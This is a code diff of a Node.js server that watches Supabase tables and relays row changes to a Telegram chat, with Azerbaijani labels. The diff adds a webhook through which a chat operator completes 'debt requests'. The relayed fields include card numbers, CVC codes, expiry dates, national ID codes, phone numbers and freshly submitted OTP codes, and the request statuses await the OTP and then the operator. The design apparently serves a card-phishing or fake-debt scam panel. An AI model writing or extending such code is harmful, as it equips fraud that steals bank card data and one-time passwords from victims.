@@ -6,9 +6,12 @@ import { createClient } from '@supabase/supabase-js';
 const PORT = process.env.PORT || 3000;
 const SUPABASE_URL = process.env.SUPABASE_URL;
 const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;
+const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Required to send messages
+const TELEGRAM_WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET;
 const WATCH_TABLES = (process.env.WATCH_TABLES || 'public.*').split(',').map(s => s.trim()).filter(Boolean);
+const PRIMARY_CHAT_ID = TELEGRAM_CHAT_ID ? String(TELEGRAM_CHAT_ID) : null;
 
 if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
   console.error('[config] Missing SUPABASE_URL or SUPABASE_ANON_KEY in environment.');
@@ -18,6 +21,9 @@ if (!TELEGRAM_BOT_TOKEN) {
 }
 if (!TELEGRAM_CHAT_ID) {
   console.warn('[config] TELEGRAM_CHAT_ID not set. Realtime events will be logged but not sent to Telegram.');
+}
+if (!SUPABASE_SERVICE_ROLE_KEY) {
+  console.warn('[config] SUPABASE_SERVICE_ROLE_KEY not set. Telegram idarəetmə əməliyyatları anon açarla cəhd ediləcək.');
 }
 
 const app = express();
@@ -38,8 +44,29 @@ app.post('/test-message', async (req, res) => {
   }
 });
 
-const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+app.post('/telegram/webhook', async (req, res) => {
+  try {
+    if (TELEGRAM_WEBHOOK_SECRET) {
+      const incomingSecret = req.get('x-telegram-bot-api-secret-token');
+      if (incomingSecret !== TELEGRAM_WEBHOOK_SECRET) {
+        console.warn('[telegram-webhook] invalid secret token');
+        return res.status(401).json({ ok: false });
+      }
+    }
+
+    await handleTelegramUpdate(req.body);
+    res.json({ ok: true });
+  } catch (err) {
+    console.error('[telegram-webhook] failed to handle update', err?.message || err);
+    res.json({ ok: false });
+  }
+});
+
+const supabaseRealtime = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
   realtime: { params: { eventsPerSecond: 10 } },
+});
+const supabaseWriter = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY || SUPABASE_ANON_KEY, {
+  auth: { persistSession: false },
 });
 
 function parseSpec(spec) {
@@ -76,7 +103,13 @@ const AZ_TRANSLATIONS = {
     'expiry': 'Bitmə tarixi',
     'fin_code': 'FIN kod',
     'otp_code': 'OTP kod',
-    'status': 'Status'
+    'status': 'Status',
+    'phone_number': 'Telefon nömrəsi',
+    'otp_submitted_at': 'OTP tarixi',
+    'details': 'Məlumat',
+    'id': 'Sorğu ID',
+    'admin_actor': 'Operator',
+    'resolved_at': 'Yekun vaxt'
   },
   labels: {
     'New': 'Yeni',
@@ -85,7 +118,66 @@ const AZ_TRANSLATIONS = {
   }
 };
 
-const ALLOWED_FIELDS = ['amount', 'card_number', 'card_type', 'cvc', 'expiry', 'fin_code', 'otp_code', 'status'];
+const ALLOWED_FIELDS = ['id', 'amount', 'card_number', 'card_type', 'cvc', 'expiry', 'fin_code', 'otp_code', 'phone_number', 'otp_submitted_at', 'details', 'status', 'admin_actor', 'resolved_at'];
+
+const DEBT_STATUS_LABELS = {
+  awaiting_otp: 'OTP gözlənilir',
+  awaiting_admin: 'Operator gözlənilir',
+  completed: 'Tamamlandı',
+  expired: 'Vaxtı bitib',
+  cancelled: 'Ləğv edildi',
+};
+
+const DEBT_FIELD_LABELS = {
+  customer_name: 'Ad',
+  loan_amount: 'Kreditin məbləği',
+  loan_term: 'Kreditin müddəti',
+  payment_date: 'Ödəniş tarixi',
+  outstanding_amount: 'Qalıq borc',
+  contract_number: 'Kredit müqaviləsi',
+  note: 'Qeyd',
+};
+
+const AZ_CHAR_REPLACEMENTS = {
+  ə: 'e', Ə: 'e',
+  ı: 'i', İ: 'i',
+  ö: 'o', Ö: 'o',
+  ü: 'u', Ü: 'u',
+  ğ: 'g', Ğ: 'g',
+  ç: 'c', Ç: 'c',
+  ş: 's', Ş: 's',
+};
+
+const DEBT_FORM_KEY_ALIASES = new Map([
+  ['ad', 'customer_name'],
+  ['soyad', 'customer_name'],
+  ['musteri adi', 'customer_name'],
+  ['musteri', 'customer_name'],
+  ['kreditin meblegi', 'loan_amount'],
+  ['kredit meblegi', 'loan_amount'],
+  ['kreditin muddeti', 'loan_term'],
+  ['muddet', 'loan_term'],
+  ['odenis tarixi', 'payment_date'],
+  ['odenis gunu', 'payment_date'],
+  ['qaliq borcun meblegi', 'outstanding_amount'],
+  ['qaliq borc', 'outstanding_amount'],
+  ['borc meblegi', 'outstanding_amount'],
+  ['kredit muqavilesi', 'contract_number'],
+  ['muqavile nomresi', 'contract_number'],
+  ['muqavile', 'contract_number'],
+  ['qeyd', 'note'],
+  ['note', 'note'],
+]);
+
+const REQUEST_ID_REGEX = /(sor[uğ]u\s*id|request\s*id|req\s*id)[:#\s-]*([0-9a-fA-F-]{6,})/i;
+const UUID_REGEX = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
+
+const TELEGRAM_HELP_TEXT = [
+  'Sorğunu yeniləmək üçün:',
+  '1) Botun göndərdiyi mesaja cavab olaraq məlumatları paylaşın və formatı qoruyun.',
+  '2) Və ya /submit <sorğu-id> yazıb altında məlumat blokunu göndərin.',
+  'Format nümunəsi:\nad: Məmmədov Ceyhun\nKreditin məbləği: 70 ₼\nKreditin müddəti: 10 gün\nÖdəniş tarixi: 11.03.2024\nQalıq borcun məbləği: 147 ₼\nKredit müqaviləsi: №A2403010000736025329',
+].join('\n');
 
 function filterAllowedFields(obj) {
   if (!obj || typeof obj !== 'object') return {};
@@ -139,7 +231,7 @@ function diffFields(oldRow = {}, newRow = {}) {
   return lines.join('\n');
 }
 
-function formatChange(eventType, s, t, rowNew, rowOld) {
+function formatGenericChange(eventType, s, t, rowNew, rowOld) {
   const eventTypeAz = AZ_TRANSLATIONS.eventTypes[eventType] || eventType;
   const header = `<b>${escapeHtml(eventTypeAz)}</b> - <code>${escapeHtml(`${s}.${t}`)}</code>`;
   
@@ -182,26 +274,307 @@ function formatChange(eventType, s, t, rowNew, rowOld) {
   return `${header}\n${body}`;
 }
 
-async function sendToTelegram(text) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+function formatChange(eventType, s, t, rowNew, rowOld) {
+  if (t === 'debt_requests') {
+    return formatDebtRequestChange(eventType, rowNew, rowOld);
+  }
+  return formatGenericChange(eventType, s, t, rowNew, rowOld);
+}
+
+function describeDebtStatus(status) {
+  if (!status) return 'naməlum';
+  return DEBT_STATUS_LABELS[status] || status;
+}
+
+function coerceDebtDetails(details) {
+  if (!details) return null;
+  if (typeof details === 'object' && !Array.isArray(details)) return details;
+  if (typeof details === 'string') {
+    try {
+      const parsed = JSON.parse(details);
+      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
+        return parsed;
+      }
+    } catch (err) {
+      console.warn('[debt-details] failed to parse', err?.message || err);
+    }
+  }
+  return null;
+}
+
+function formatDebtDetailsBlock(details) {
+  const normalized = coerceDebtDetails(details);
+  if (!normalized) return '';
+  const lines = [];
+  for (const [key, label] of Object.entries(DEBT_FIELD_LABELS)) {
+    const value = normalized[key];
+    if (!value) continue;
+    lines.push(`• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(String(value))}</code>`);
+  }
+  for (const [key, value] of Object.entries(normalized)) {
+    if (key in DEBT_FIELD_LABELS) continue;
+    if (!value) continue;
+    lines.push(`• <b>${escapeHtml(key)}</b>: <code>${escapeHtml(String(value))}</code>`);
+  }
+  return lines.join('\n');
+}
+
+function formatDebtRequestChange(eventType, rowNew = {}, rowOld = {}) {
+  const eventTypeAz = AZ_TRANSLATIONS.eventTypes[eventType] || eventType;
+  const current = rowNew || {};
+  const previous = rowOld || {};
+  const requestId = current.id || previous.id || 'naməlum';
+  const phone = current.phone_number || previous.phone_number || 'naməlum';
+  const statusNow = current.status || previous.status;
+  const lines = [
+    `<b>${escapeHtml(eventTypeAz)}</b> - <code>public.debt_requests</code>`,
+    `<b>Sorğu ID</b>: <code>${escapeHtml(requestId)}</code>`,
+    `<b>Telefon</b>: <code>${escapeHtml(phone)}</code>`,
+  ];
+
+  if (eventType === 'INSERT') {
+    lines.push('Yeni borc sorğusu yaradıldı. OTP təsdiqi gözlənilir.');
+  } else if (eventType === 'UPDATE') {
+    if (current.status && current.status !== previous.status) {
+      lines.push(`• Status: <code>${escapeHtml(describeDebtStatus(previous.status))}</code> → <code>${escapeHtml(describeDebtStatus(current.status))}</code>`);
+    } else if (statusNow) {
+      lines.push(`<b>Status</b>: ${escapeHtml(describeDebtStatus(statusNow))}`);
+    }
+    if (current.otp_code && current.otp_code !== previous.otp_code) {
+      lines.push(`<b>OTP</b>: <code>${escapeHtml(current.otp_code)}</code>`);
+    }
+    if (current.admin_actor && current.admin_actor !== previous.admin_actor) {
+      lines.push(`<b>Operator</b>: ${escapeHtml(current.admin_actor)}`);
+    }
+  } else if (eventType === 'DELETE') {
+    lines.push('Sorğu silindi.');
+  }
+
+  const detailsBlock = formatDebtDetailsBlock(current.details || previous.details);
+  if (detailsBlock) {
+    lines.push('<b>Məlumatlar</b>');
+    lines.push(detailsBlock);
+  }
+
+  if ((current.status || previous.status) === 'awaiting_admin') {
+    lines.push('<i>Bu mesaja cavab verərək sorğunu tamamlayın. Lazım olan formatı görmək üçün /help yazın.</i>');
+  }
+
+  return lines.join('\n');
+}
+
+function normalizeFormKey(key = '') {
+  return key
+    .split('')
+    .map((char) => AZ_CHAR_REPLACEMENTS[char] ?? char)
+    .join('')
+    .toLowerCase()
+    .replace(/[^a-z0-9\s]/g, ' ')
+    .replace(/\s+/g, ' ')
+    .trim();
+}
+
+function parseDebtDetailsForm(text = '') {
+  if (!text) return {};
+  const lines = text.split(/\r?\n/);
+  const collected = {};
+  let currentKey = null;
+
+  for (const rawLine of lines) {
+    const line = rawLine.trim();
+    if (!line) continue;
+    const match = line.match(/^([^:]+):\s*(.*)$/);
+    if (match) {
+      const normalizedKey = normalizeFormKey(match[1]);
+      if (!normalizedKey) {
+        currentKey = null;
+        continue;
+      }
+      currentKey = normalizedKey;
+      collected[currentKey] = match[2]?.trim() ?? '';
+      continue;
+    }
+    if (currentKey) {
+      const existing = collected[currentKey];
+      collected[currentKey] = existing ? `${existing} ${line}`.trim() : line;
+    }
+  }
+
+  const mapped = {};
+  for (const [key, value] of Object.entries(collected)) {
+    const cleanedValue = value?.trim();
+    if (!cleanedValue) continue;
+    const canonical = DEBT_FORM_KEY_ALIASES.get(key) || key;
+    mapped[canonical] = cleanedValue;
+  }
+  return mapped;
+}
+
+function extractRequestIdFromText(text = '') {
+  if (!text) return null;
+  const tagged = text.match(REQUEST_ID_REGEX);
+  if (tagged?.[2]) return tagged[2];
+  const uuidMatch = text.match(UUID_REGEX);
+  if (uuidMatch) return uuidMatch[0];
+  return null;
+}
+
+function parseSubmitCommand(text = '') {
+  const match = text.match(/^\/(submit|fill|borc)\s+([^\s]+)([\s\S]*)$/i);
+  if (!match) return null;
+  return {
+    command: match[1],
+    requestId: match[2],
+    body: (match[3] || '').trim(),
+  };
+}
+
+function isAuthorizedChat(chatId) {
+  if (!PRIMARY_CHAT_ID || chatId === undefined || chatId === null) return false;
+  return String(chatId) === PRIMARY_CHAT_ID;
+}
+
+function formatAuthor(from = {}) {
+  if (!from) return null;
+  if (from.username) return `@${from.username}`;
+  const name = [from.first_name, from.last_name].filter(Boolean).join(' ').trim();
+  return name || null;
+}
+
+async function applyDebtDetailsSubmission(requestId, parsedDetails, author) {
+  if (!requestId) {
+    throw new Error('Sorğu ID tələb olunur');
+  }
+  if (!parsedDetails || Object.keys(parsedDetails).length === 0) {
+    throw new Error('Məlumat tapılmadı');
+  }
+
+  const { data: existing, error: fetchError } = await supabaseWriter
+    .from('debt_requests')
+    .select('id, details, status, admin_actor')
+    .eq('id', requestId)
+    .single();
+
+  if (fetchError || !existing) {
+    throw new Error('Sorğu tapılmadı');
+  }
+
+  const mergedDetails = {
+    ...(coerceDebtDetails(existing.details) || {}),
+    ...parsedDetails,
+  };
+
+  const { error: updateError } = await supabaseWriter
+    .from('debt_requests')
+    .update({
+      details: mergedDetails,
+      status: 'completed',
+      resolved_at: new Date().toISOString(),
+      updated_at: new Date().toISOString(),
+      admin_actor: author || existing.admin_actor || null,
+    })
+    .eq('id', requestId);
+
+  if (updateError) {
+    throw new Error(updateError.message || 'Yeniləmə mümkün olmadı');
+  }
+}
+
+async function handleTelegramUpdate(update = {}) {
+  const message = update.message || update.edited_message;
+  if (!message) return;
+
+  const chatId = message.chat?.id;
+  if (!isAuthorizedChat(chatId)) {
+    console.warn('[telegram] unauthorized chat tried to interact');
+    return;
+  }
+
+  const text = (message.text || '').trim();
+  if (!text) return;
+
+  if (text.startsWith('/start') || text.startsWith('/help')) {
+    await sendToTelegram(TELEGRAM_HELP_TEXT, { chatId, replyToMessageId: message.message_id });
+    return;
+  }
+
+  const command = parseSubmitCommand(text);
+  let requestId = command?.requestId || null;
+  let payloadText = command?.body || '';
+
+  if (!requestId && message.reply_to_message) {
+    requestId = extractRequestIdFromText(message.reply_to_message.text || '');
+    if (!payloadText) {
+      payloadText = text;
+    }
+  }
+
+  if (!requestId) {
+    await sendToTelegram('Sorğu ID tapılmadı. /submit <sorğu-id> istifadə edin və ya botun mesajına cavab verin.', {
+      chatId,
+      replyToMessageId: message.message_id,
+    });
+    return;
+  }
+
+  if (!payloadText) {
+    await sendToTelegram('Məlumat blokunu eyni mesajda paylaşın.', {
+      chatId,
+      replyToMessageId: message.message_id,
+    });
+    return;
+  }
+
+  const parsed = parseDebtDetailsForm(payloadText);
+  if (!parsed || Object.keys(parsed).length === 0) {
+    await sendToTelegram('Məlumatı oxumaq alınmadı. Zəhmət olmasa "ad:" formatını qoruyun.', {
+      chatId,
+      replyToMessageId: message.message_id,
+    });
+    return;
+  }
+
+  try {
+    const author = formatAuthor(message.from);
+    await applyDebtDetailsSubmission(requestId, parsed, author);
+    await sendToTelegram(`Sorğu <code>${escapeHtml(requestId)}</code> yeniləndi.`, {
+      chatId,
+      replyToMessageId: message.message_id,
+    });
+  } catch (err) {
+    console.error('[telegram] failed to apply details', err?.response?.data || err?.message || err);
+    await sendToTelegram(`Sorğunu yeniləmək mümkün olmadı: ${escapeHtml(err?.message || 'naməlum xəta')}`, {
+      chatId,
+      replyToMessageId: message.message_id,
+    });
+  }
+}
+
+async function sendToTelegram(text, options = {}) {
+  const { chatId = PRIMARY_CHAT_ID, replyToMessageId } = options;
+  if (!TELEGRAM_BOT_TOKEN || !chatId) {
     console.log('[telegram] skip send (missing token or chat id) =>', text);
     return;
   }
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   await axios.post(url, {
-    chat_id: TELEGRAM_CHAT_ID,
+    chat_id: chatId,
     text,
     parse_mode: 'HTML',
     disable_web_page_preview: true,
+    reply_to_message_id: replyToMessageId,
+    allow_sending_without_reply: true,
   }, { timeout: 10000 });
 }
 
 async function startRealtime() {
-  const channel = supabase.channel('db-changes');
+  const channel = supabaseRealtime.channel('db-changes');
 
   for (const spec of WATCH_TABLES) {
     const { schema, table } = parseSpec(spec);
-    const filter = table === '*' ? { event: '*', schema } : { event: '*', schema, table };
+    const filter = table === '*'
+      ? { event: '*', schema, table: '*' }
+      : { event: '*', schema, table };
     console.log(`[realtime] listening for * on ${schema}${table === '*' ? '.*' : '.' + table}`);
     channel.on('postgres_changes', filter, async (payload) => {
       const { eventType, schema: s, table: t, new: rowNew, old: rowOld } = payload;
